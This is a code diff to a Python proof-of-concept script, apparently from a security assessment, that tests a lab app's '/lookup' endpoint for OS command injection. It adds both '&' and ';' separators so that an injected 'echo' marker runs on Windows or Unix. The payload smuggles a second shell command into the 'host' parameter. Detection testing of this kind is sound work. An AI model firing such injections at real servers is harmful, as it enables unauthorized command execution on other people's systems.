@@ -8,7 +8,11 @@ an `echo` of a random marker string. If that marker shows up in the
 response, arbitrary command execution is proven, cleanly and
 repeatably, without needing to rely on a specific file existing at a
 specific path.
+
+Cross-platform: tries Windows-style '& echo' and Unix-style '; echo'
+so the attack works regardless of the OS the server runs on.
 """
+import sys
 import requests
 import secrets
 
@@ -16,6 +20,10 @@ FINDING_ID = "F-03"
 TITLE = "OS Command Injection in Diagnostic Lookup Endpoint"
 SEVERITY = "Critical"
 AFFECTED_COMPONENT = "target_app/routes/utils.py :: GET /lookup"
+
+# On Windows cmd.exe uses '&' to chain commands; POSIX shells use ';'.
+# Build both so we detect the injection regardless of which shell is active.
+_SEPARATORS = ["&", ";"] if sys.platform == "win32" else [";", "&"]
 
 
 def attack(base_url: str = "http://localhost:8001") -> dict:
@@ -30,26 +38,27 @@ def attack(base_url: str = "http://localhost:8001") -> dict:
     }
 
     marker = f"SENTINEL_CMDI_{secrets.token_hex(4)}"
-    payload = f"127.0.0.1; echo {marker}"
 
-    try:
-        r = requests.get(f"{base_url}/lookup", params={"host": payload}, timeout=5)
-    except requests.RequestException as e:
-        result["error"] = f"Could not reach target: {e}"
-        return result
+    for sep in _SEPARATORS:
+        payload = f"127.0.0.1 {sep} echo {marker}"
+        try:
+            r = requests.get(f"{base_url}/lookup", params={"host": payload}, timeout=5)
+        except requests.RequestException as e:
+            result["error"] = f"Could not reach target: {e}"
+            return result
 
-    if r.status_code != 200:
-        return result
+        if r.status_code != 200:
+            continue
 
-    output = r.text
-    result["vulnerable"] = marker in output
-
-    if result["vulnerable"]:
-        result["evidence"] = {
-            "payload": payload,
-            "marker_injected": marker,
-            "raw_output": output,
-        }
+        output = r.text
+        if marker in output:
+            result["vulnerable"] = True
+            result["evidence"] = {
+                "payload": payload,
+                "marker_injected": marker,
+                "raw_output": output,
+            }
+            return result
 
     return result
 
